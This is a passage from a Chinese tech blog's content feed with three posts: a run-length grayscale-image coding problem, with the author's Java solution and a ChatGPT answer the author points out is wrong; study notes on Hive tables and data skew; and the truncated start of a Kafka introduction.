class="number">21</span></span><br><span class="line"><span class="number">1</span>、所有数值以空格分隔</span><br><span class="line"><span class="number">2</span>、前两个数分别表示矩阵的行数和列数</span><br><span class="line"><span class="number">3</span>、从第三个数开始，每两个数一组，每组第一个数是灰阶值，第二个数表示该灰阶值从左到右，从上到下（可理解为将二维数组按行存储在一维矩阵中）的连续像素个数。比如题目所述例子，“<span class="number">255</span> <span class="number">34</span>”表示有连续<span class="number">34</span>个像素的灰阶值是<span class="number">255</span>。</span><br><span class="line">如此，图像软件在打开此格式灰度图的时候，就可以根据此算法从压缩数据恢复出原始灰度图矩阵。</span><br><span class="line">请从输入的压缩数恢复灰度图原始矩阵，并返回指定像素的灰阶值。</span><br><span class="line"></span><br><span class="line"><span class="number">10</span> <span class="number">10</span> <span class="number">255</span> <span class="number">34</span> <span class="number">0</span> <span class="number">1</span> <span class="number">255</span> <span class="number">8</span> <span class="number">0</span> <span class="number">3</span> <span class="number">255</span> <span class="number">6</span> <span class="number">0</span> <span class="number">5</span> <span class="number">255</span> <span class="number">4</span> <span class="number">0</span> <span class="number">7</span> <span class="number">255</span> <span class="number">2</span> <span class="number">0</span> <span class="number">9</span> <span class="number">255</span> <span class="number">21</span></span><br><span class="line"><span class="number">3</span> <span class="number">4</span></span><br><span class="line">输入包括两行，第一行是灰度图压缩数据，第二行表示一个像素位置的行号和列号，如：<span class="number">0</span> <span class="number">0</span> 表示左上角像素。</span><br><span class="line"></span><br><span class="line">附加条件：</span><br><span class="line">输入数据表示的灰阶矩阵的指定像素的灰阶值。</span><br><span class="line"><span class="number">1</span>、系统保证输入的压缩数据是合法有效的，不会出现数据越界、数值不合法等无法恢复的场景；</span><br><span class="line"><span class="number">2</span>、系统保证输入的像素坐标是合法的，不会出现不在矩阵中的像素；</span><br><span class="line"><span class="number">3</span>、矩阵的行和列数范围为：(<span class="number">0</span>,<span class="number">100</span>]；</span><br><span class="line"><span class="number">4</span>、灰阶值取值范围：[<span class="number">0</span>, <span class="number">255</span>]；</span><br></pre></td></tr></table></figure></blockquote><p>​由于长期使用ChatGPT等工具原因，考试不能百度、代码也不能补全，因此很多基础的语法都有些生疏了。科学飞速发展的阶段，我享受科技进步带来的便捷，并逐渐产生依赖。当有一天它不能使用时，亦或是像如今的手机一样，AI时代的到临，人类该何去何从？越说越远了，哈哈哈，上代码吧。下面是我的解题思路及全部代码。(遇事不决、暴力破解)</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Author: Rupert Tears</span></span><br><span class="line"><span class="comment"> * Date: Created in 19:52 2024/3/5</span></span><br><span class="line"><span class="comment"> * Description: Thought is already is late, exactly is the earliest time.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">one</span> &#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 黑白图像常采用灰度图的方式存储，即图像的每个像素填充一个灰阶值，256阶灰度图是一个灰阶值取值范围为0-255的灰阶矩阵，0表示全黑、255表示全白，范围内的其他值表示不同的灰度，比如下面的图像及其对应的灰阶矩阵</span></span><br><span class="line"><span class="comment">     * 但在计算机中实际存储时，会使用压缩算法，其中一种压缩格式和描述如下：</span></span><br><span class="line"><span class="comment">     * 10 10 255 34 0 1 255 8 0 3 255 6 0 5 255 4 0 7 255 2 0 9 255 21</span></span><br><span class="line"><span class="comment">     * 1、所有数值以空格分隔</span></span><br><span class="line"><span class="comment">     * 2、前两个数分别表示矩阵的行数和列数</span></span><br><span class="line"><span class="comment">     * 3、从第三个数开始，每两个数一组，每组第一个数是灰阶值，第二个数表示该灰阶值从左到右，从上到下（可理解为将二维数组按行存储在一维矩阵中）的连续像素个数。比如题目所述例子，“255 34”表示有连续34个像素的灰阶值是255。</span></span><br><span class="line"><span class="comment">     * 如此，图像软件在打开此格式灰度图的时候，就可以根据此算法从压缩数据恢复出原始灰度图矩阵。</span></span><br><span class="line"><span class="comment">     * 请从输入的压缩数恢复灰度图原始矩阵，并返回指定像素的灰阶值。</span></span><br><span class="line"><span class="comment">     * &lt;p&gt;</span></span><br><span class="line"><span class="comment">     * 10 10 255 34 0 1 255 8 0 3 255 6 0 5 255 4 0 7 255 2 0 9 255 21</span></span><br><span class="line"><span class="comment">     * 3 4</span></span><br><span class="line"><span class="comment">     * 输入包括两行，第一行是灰度图压缩数据，第二行表示一个像素位置的行号和列号，如：0 0 表示左上角像素。</span></span><br><span class="line"><span class="comment">     * 0</span></span><br><span class="line"><span class="comment">     * 输入数据表示的灰阶矩阵的指定像素的灰阶值。</span></span><br><span class="line"><span class="comment">     * 1、系统保证输入的压缩数据是合法有效的，不会出现数据越界、数值不合法等无法恢复的场景；</span></span><br><span class="line"><span class="comment">     * 2、系统保证输入的像素坐标是合法的，不会出现不在矩阵中的像素；</span></span><br><span class="line"><span class="comment">     * 3、矩阵的行和列数范围为：(0,100]；</span></span><br><span class="line"><span class="comment">     * 4、灰阶值取值范围：[0, 255]；</span></span><br><span class="line"><span class="comment">     * &lt;p&gt;</span></span><br><span class="line"><span class="comment">     * &lt;p&gt;</span></span><br><span class="line"><span class="comment">     * 3 5</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * Author: Rupert-Tears</span></span><br><span class="line"><span class="comment">         * CreateTime: 21:10 2024/3/5</span></span><br><span class="line"><span class="comment">         * Description:</span></span><br><span class="line"><span class="comment">         * 10 10 56 34 99 1 87 8 99 3 255 6 99 5 255 4 99 7 255 2 99 9 255 21</span></span><br><span class="line"><span class="comment">         * 3 4</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="comment">// 1. 输入两行数据,第一行代表图形压缩的数据,第二行代表读取的位置;</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">origin</span> <span class="operator">=</span> <span class="string">&quot;10 10 56 34 99 1 87 8 99 3 255 6 99 5 255 4 99 7 255 2 99 9 255 21\n1 1&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         *</span></span><br><span class="line"><span class="comment">         *</span></span><br><span class="line"><span class="comment">         *</span></span><br><span class="line"><span class="comment">         * 56 56 56 56 56 56 56 56 56 56</span></span><br><span class="line"><span class="comment">         * 56 56 56 56 56 56 56 56 56 56</span></span><br><span class="line"><span class="comment">         * 56 56 56 56 56 56 56 56 56 56</span></span><br><span class="line"><span class="comment">         * 56 56 56 56 99 87 87 87 87 87</span></span><br><span class="line"><span class="comment">         * 87 87 87 99 99 99 255 255 255 255</span></span><br><span class="line"><span class="comment">         * 255 255 99 99 99 99 99 255 255 255</span></span><br><span class="line"><span class="comment">         * 255 99 99 99 99 99 99 99 255 255</span></span><br><span class="line"><span class="comment">         * 99 99 99 99 99 99 99 99 99 255</span></span><br><span class="line"><span class="comment">         * 255 255 255 255 255 255 255  255 255 255</span></span><br><span class="line"><span class="comment">         * 255 255 255 255 255 255 255  255 255 255</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">final</span> <span class="type">String</span> <span class="variable">grayValue</span> <span class="operator">=</span> getGrayValue(origin);</span><br><span class="line">        System.out.println(grayValue);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> String <span class="title function_">getGrayValue</span><span class="params">(String origin)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">data</span> <span class="operator">=</span> origin.split(<span class="string">&quot;\n&quot;</span>)[<span class="number">0</span>];</span><br><span class="line">        String[] split = data.split(<span class="string">&quot; &quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">row</span> <span class="operator">=</span> split[<span class="number">0</span>];</span><br><span class="line">        <span class="type">String</span> <span class="variable">column</span> <span class="operator">=</span> split[<span class="number">1</span>];</span><br><span class="line">        List&lt;String&gt; list = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; split.length; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (i == <span class="number">0</span> || i == <span class="number">1</span>) &#123;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                list.add(split[i]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(<span class="string">&quot;row: &quot;</span> + row);</span><br><span class="line">        System.out.println(<span class="string">&quot;column: &quot;</span> + column);</span><br><span class="line">        System.out.println(<span class="string">&quot;list: &quot;</span> + list);</span><br><span class="line">        <span class="comment">// 10 行 10列  100个元素</span></span><br><span class="line">        <span class="comment">// 3 行 4列  (3-1)*10+4 = 24;     第24个元素</span></span><br><span class="line">        <span class="comment">// list 奇数是颜色 偶数是位置</span></span><br><span class="line">        <span class="comment">// 判断 目标元素数值&gt;第一个奇数位置,若小于或等于则取这个奇数前一位的数值作为颜色</span></span><br><span class="line">        <span class="comment">//      目标元素数值&lt;第一个奇数位置,用第一个奇数位置的值加第二个奇数位置的值,继续判断,依次类推找出元素颜色;</span></span><br><span class="line">        <span class="comment">// 新建颜色list</span></span><br><span class="line">        List&lt;String&gt; colour = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">        <span class="comment">// 新建位置list</span></span><br><span class="line">        List&lt;String&gt; location = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">        <span class="type">boolean</span> <span class="variable">flag</span> <span class="operator">=</span> <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; list.size(); i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (flag) &#123;</span><br><span class="line">                colour.add(list.get(i));</span><br><span class="line">                flag = <span class="literal">false</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                location.add(list.get(i));</span><br><span class="line">                flag = <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(<span class="string">&quot;colour:&quot;</span> + colour);</span><br><span class="line">        System.out.println(<span class="string">&quot;location:&quot;</span> + location);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 入参为 3,4</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">input</span> <span class="operator">=</span> origin.split(<span class="string">&quot;\n&quot;</span>)[<span class="number">1</span>];</span><br><span class="line">        <span class="keyword">final</span> <span class="type">String</span> <span class="variable">row_value</span> <span class="operator">=</span> input.split(<span class="string">&quot; &quot;</span>)[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">final</span> <span class="type">String</span> <span class="variable">column_value</span> <span class="operator">=</span> input.split(<span class="string">&quot; &quot;</span>)[<span class="number">1</span>];</span><br><span class="line">        System.out.println(<span class="string">&quot;row_value: &quot;</span> + row_value);</span><br><span class="line">        System.out.println(<span class="string">&quot;column_value: &quot;</span> + column_value);</span><br><span class="line">        <span class="type">int</span> <span class="variable">target_location</span> <span class="operator">=</span> (Integer.parseInt(row_value) - <span class="number">1</span>) * Integer.parseInt(row) + Integer.parseInt(column_value);</span><br><span class="line">        System.out.println(<span class="string">&quot;target_location:&quot;</span> + target_location);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// target_location 24</span></span><br><span class="line">        <span class="comment">// location:[34, 1, 8, 3, 6, 5, 4, 7, 2, 9, 21]</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// index</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">final</span> <span class="type">int</span> <span class="variable">index</span> <span class="operator">=</span> getIndex(location, target_location);</span><br><span class="line">        System.out.println(<span class="string">&quot;index:&quot;</span> + index);</span><br><span class="line">        System.out.println(<span class="string">&quot;result:&quot;</span> + colour.get(index));</span><br><span class="line">        <span class="keyword">return</span> colour.get(index);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">int</span> <span class="title function_">getIndex</span><span class="params">(List&lt;String&gt; location, <span class="type">int</span> target_location)</span> &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; location.size(); i++) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">location_sum</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i1</span> <span class="operator">=</span> <span class="number">0</span>; i1 &lt; i+<span class="number">1</span>; i1++) &#123;</span><br><span class="line">                location_sum += Integer.parseInt(location.get(i1));</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (target_location &lt;= location_sum) &#123;</span><br><span class="line">                <span class="keyword">return</span> i;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><blockquote><p>现在我们在借助科技的力量，看看ChatGPT怎么解。</p><p>输入题干后，我们的人工智能GPT，15秒就给出了解题思路和答案，接下来让我们一起看一下吧。</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">主要任务是从给定的压缩数据中恢复出原始灰度图矩阵，并且能够根据给定的像素位置返回其灰阶值。</span><br><span class="line"><span class="number">1.</span>解析输入数据：首先，我们需要解析输入的压缩数据和像素位置。</span><br><span class="line"><span class="number">2.</span>恢复灰度图矩阵：根据压缩数据，我们可以构建原始的灰度图矩阵。对于每一组压缩数据，我们将对应的灰阶值填充到矩阵中连续的像素位置。</span><br><span class="line"><span class="number">3.</span>返回指定像素的灰阶值：根据给定的像素位置，我们可以直接在恢复的灰度图矩阵中查找对应位置的灰阶值。</span><br></pre></td></tr></table></figure><blockquote><p>下面是相应的Java代码实现：</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">// 读取输入</span></span><br><span class="line">        <span class="type">Scanner</span> <span class="variable">scanner</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(System.in);</span><br><span class="line">        <span class="type">String</span> <span class="variable">compressData</span> <span class="operator">=</span> scanner.nextLine(); <span class="comment">// 压缩数据</span></span><br><span class="line">        String[] pixelPosition = scanner.nextLine().split(<span class="string">&quot; &quot;</span>); <span class="comment">// 像素位置</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 解析压缩数据</span></span><br><span class="line">        String[] compressArr = compressData.split(<span class="string">&quot; &quot;</span>);</span><br><span class="line">        <span class="type">int</span> <span class="variable">rows</span> <span class="operator">=</span> Integer.parseInt(compressArr[<span class="number">0</span>]); <span class="comment">// 矩阵行数</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">cols</span> <span class="operator">=</span> Integer.parseInt(compressArr[<span class="number">1</span>]); <span class="comment">// 矩阵列数</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 恢复灰度图矩阵</span></span><br><span class="line">        <span class="type">int</span>[][] matrix = <span class="keyword">new</span> <span class="title class_">int</span>[rows][cols];</span><br><span class="line">        <span class="type">int</span> <span class="variable">index</span> <span class="operator">=</span> <span class="number">2</span>; <span class="comment">// 从第三个数开始解析压缩数据</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; rows; i++) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">0</span>; j &lt; cols; j++) &#123;</span><br><span class="line">                <span class="type">int</span> <span class="variable">grayValue</span> <span class="operator">=</span> Integer.parseInt(compressArr[index]); <span class="comment">// 当前灰阶值</span></span><br><span class="line">                <span class="type">int</span> <span class="variable">pixelCount</span> <span class="operator">=</span> Integer.parseInt(compressArr[index + <span class="number">1</span>]); <span class="comment">// 连续像素个数</span></span><br><span class="line">                matrix[i][j] = grayValue; <span class="comment">// 填充灰度图矩阵</span></span><br><span class="line">                index += <span class="number">2</span>; <span class="comment">// 移动到下一组压缩数据</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 返回指定像素的灰阶值</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">row</span> <span class="operator">=</span> Integer.parseInt(pixelPosition[<span class="number">0</span>]);</span><br><span class="line">        <span class="type">int</span> <span class="variable">col</span> <span class="operator">=</span> Integer.parseInt(pixelPosition[<span class="number">1</span>]);</span><br><span class="line">        <span class="type">int</span> <span class="variable">grayValue</span> <span class="operator">=</span> matrix[row][col];</span><br><span class="line">        System.out.println(grayValue);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>很显然，他提供的逻辑是错误的，看来GTP3.5的智商还是不够啊，期待GPT7的到来，今晚听360周总说要在2027年，智商高达140，正常人也就100的智商，爱因斯坦160的智商，这样的超级人工智能，福兮祸兮，三年后一见分晓。</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 算法 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>每日分享 Hive</title>
      <link href="/blog/dcd37475.html/"/>
      <url>/blog/dcd37475.html/</url>
      
        <content type="html"><![CDATA[<h1 id="一、Hive是什么？"><a href="#一、Hive是什么？" class="headerlink" title="一、Hive是什么？"></a>一、Hive是什么？</h1><blockquote><p>Hive提供了一种SQL(结构化查询)语言，可以将结构化的文件映射为一张表，查询存储在HDFS上的数据或者其他在HDFS上的文件系统，例如HBase。</p><p>优点：</p><ul><li>操作接口采用类SQL的语法，快速开发</li><li>避免学习MapReduce，减小学习成本</li><li>支持用户自定义函数</li><li>处理大数据便捷</li></ul><p>缺点：</p><ul><li>执行延迟比较高，自动生成的MapReduce作业比较慢</li><li>表达能力有限，体现在迭代式算法无法表达、MapReduce数据处理流程限制，无限实现效率更高的算法</li><li>不支持记录级别的更新、插入、删除操作</li></ul></blockquote><h1 id="二、Hive架构"><a href="#二、Hive架构" class="headerlink" title="二、Hive架构"></a>二、Hive架构</h1><blockquote><p>用户接口（Client）：CLI、JDBC&#x2F;ODBC、WEBUI</p><p>元数据（Meta store）：表名、表所属数据库、表的拥有者、列&#x2F;分区字段、表的类型（内、外部表）、表的数据所在目录等</p><p>驱动器（Driver）</p><ul><li>解析器：将SQL字符串转换成抽象语法树AST，一般都用第三方工具完成，比如antlr</li><li>编译器：将AST编译成逻辑执行计划</li><li>优化器：将逻辑执行计划进行优化</li><li>执行器：将逻辑执行计划转化为物理计划，例如MR&#x2F;SPARK</li></ul></blockquote><h1 id="三、Hive内外部表"><a href="#三、Hive内外部表" class="headerlink" title="三、Hive内外部表"></a>三、Hive内外部表</h1><blockquote><p>内部表、外部表：是否被external修饰</p><p>内部表存储的位置：hive.metastore.warehouse.dir（默认是 &#x2F;user&#x2F;hive&#x2F;warehouse）</p><p>外部表数据存储位置是自己规定的（如果没有location）在HDFS上的&#x2F;user&#x2F;hive&#x2F;warehouse下以外部表的表名创建一个文件夹</p><p>内部表的数据由Hive自身管理</p><p>外部表的数据有HDFS管理</p><p>创建表：</p><p>创建内部表时，数据将移动到数据仓库指向的路径</p><p>创建外部表时，仅记录数据所在路径</p><p>删除表：</p><p>删除内部表时，元数据和数据一起被删除</p><p>删除外部表时，只删除元数据</p><p>外部表的优点：</p><ul><li>外部表不会加载到Hive的默认仓库，减少数据的传输，同时还能和其他外部表共享数据</li><li>使用外部表，hive不会修改源数据，不用担心数据损坏或丢失</li></ul></blockquote><h1 id="四、Hive数据倾斜"><a href="#四、Hive数据倾斜" class="headerlink" title="四、Hive数据倾斜"></a>四、Hive数据倾斜</h1><blockquote><ul><li><p>什么是数据倾斜？</p><p>数据倾斜主要表现在 map&#x2F;reduce 程序执行时，reduce节点大部分执行完毕，但有一个或者几个reduce节点运行很慢，导致整个程序的处理时间很长。</p><p>这是因为某一个key的条数比其他key多很多，这条key节点所处理的数据量比其他节点大很多，从而导致某几个节点迟迟运行不完。</p></li><li><p>数据倾斜的原因</p><p>join：其中一个表较小、但key集中，分发到某一个或者几个reduce上的数据远远高于平均值</p><p>大表与大表：，但分桶的判断字段0值、空值过多，这些空值都由一个reduce处理，非常慢</p><p>group by：group by维度过小，某值的数量过多，处理某值的reduce非常耗时</p><p>count distinct，某特殊值过多，处理此特殊值的reduce非常耗时</p></li><li><p>原因：</p><ul><li>key分布不均匀</li><li>业务数据本身特性</li><li>建表是考虑不周</li><li>某些sql本身就有数据倾斜</li></ul></li><li><p>现象：</p><ul><li>任务进度长时间维持在99%，查看任务监控页面，只发现有少量（1个或几个）reduce子任务未完成。因为其处理的数据量和其他reduce差异过大。</li><li>单一reduce的记录数与平均记录数差异过大，通常可能达到3倍甚至更多。最长时长远远大于平均时长。</li></ul></li><li><p>解决方案</p><ul><li><p>参数调节</p><ul><li>hive.map.aggr &#x3D; true</li><li>hive.groupby,skewindata &#x3D; true</li></ul></li><li><p>map端部分聚合，相当于combiner</p></li><li><p>有数据倾斜的时候进行负载均衡，当选型设置为true，生成的查询计划会有两个MR Job。</p><ul><li>第一个mr job中，map的输出结果会随机的分布到reduce中，每个reduce做部分聚合操作，并输出结果。这样处理的结果是相同的group by key有可能被分发到不同的reduce中，从而达到负载均衡的目的。</li><li>第二个mr job再根据预处理的数据结果按照 group by key分布到reduce中（这个过程保证相同的key被分布到同一个reduce中）最后完成最终的聚合操作。</li></ul></li><li><p>sql语句调节</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">如何join：</span><br><span class="line">关于驱动表的选取，选用join key分布最均匀的表最为驱动表，做好列裁剪和filter操作，以达到两表做join的时候，数据量相对较少。</span><br><span class="line">使用map join让小的维度表（1000条以下记录数）先进内存，在map端完成reduce</span><br><span class="line">    </span><br><span class="line">大表join大表：</span><br><span class="line">把空值的key变成一个字符串加上随机数，把倾斜的数据分到不同的reduce上，由于nul值关联不上，处理后并不影响最终结果。</span><br><span class="line">    </span><br><span class="line">count distinct大量相同特殊值：</span><br><span class="line">count distinct时，将值为空的情况单独处理，如果是计算count distinct，可以不用处理，直接过滤，在最后结果+1</span><br><span class="line">    </span><br><span class="line">group by维度过小：</span><br><span class="line">采用sum() group by的方式来替换count（distinct）完成计算</span><br><span class="line">    </span><br><span class="line">特殊情况特殊处理：</span><br><span class="line">业务逻辑优化效果一般的情况下，可以将数据倾斜的数据单独拿出来处理，最后union回去。</span><br></pre></td></tr></table></figure></li></ul></li></ul></blockquote>]]></content>
      
      
      <categories>
          
          <category> 大数据 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 每日分享 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>每日分享 Kafka</title>
      <link href="/blog/c8b53445.html/"/>
      <url>/blog/c8b53445.html/</url>
      
        <content type="html"><![CDATA[<h1 id="一、Kafka是什么"><a href="#一、Kafka是什么" class="headerlink" title="一、Kafka是什么?"></a>一、Kafka是什么?</h1><blockquote><p>Kafka 一个分布式的、多分区、多副本、多订阅者，流式数据处理的平台。它具有消息系统（发布、订阅）的能力，也有实时流式数据处理和分析的能力，我们更多偏向于把它当做消息队列系统来使用。</p><ul><li>以时间复杂度O(1)的方式提供持久化能力，即使应对TB以上的数据也能保证常数时间复杂度的访问性能</li><li>高吞吐率，廉价商用机器也能作做到单机每秒100K条以上的消息传输</li><li>支持消息分区、及分布式消费，同时保证每个Partition内的消息顺序传输</li><li>同时支持离线数据处理和实时数据处理</li><li>支持在线水平拓展</li></ul></blockquote><h1 id="二、相关名词解释"><a href="#二、相关名词解释" class="headerlink" title="二、相关名词解释"></a>二、相关名词解释</h1><h2 id="（1）Broker-代理服务器"><a href="#（1）Broker-代理服务器" class="headerlink" title="（1）Broker 代理服务器"></a>（1）Broker 代理服务器</h2><blockquote><p>一个kafka代理服务器也被称之为Broker，它接收生产者发送的消息并存入磁盘。</p><p>Broker同时服务消费者拉取分区消息的请求，返回目前已经提交的消息。</p></blockquote><h2 id="（2）Topic-主题"><a href="#（2）Topic-主题" class="headerlink" title="（2）Topic 主题"></a>（2）Topic 主题</h2><blockquote><p>在kafka中消息以主题（topic）来分类，每一个主题都对应一个消息队列。</p></blockquote><h2 id="（3）Partition-分区"><a href="#（3）Partition-分区" class="headerlink" title="（3）Partition 分区"></a>（3）Partition 分区</h2><blockquote><p>topic物理上的分组，一个topic可以分为多个partition，每一个partition是一个有序的队列。</p></blockquote><h2 id="（4）Segment-段"><a href="#（4）Segment-段" class="headerlink" title="（4）Segment 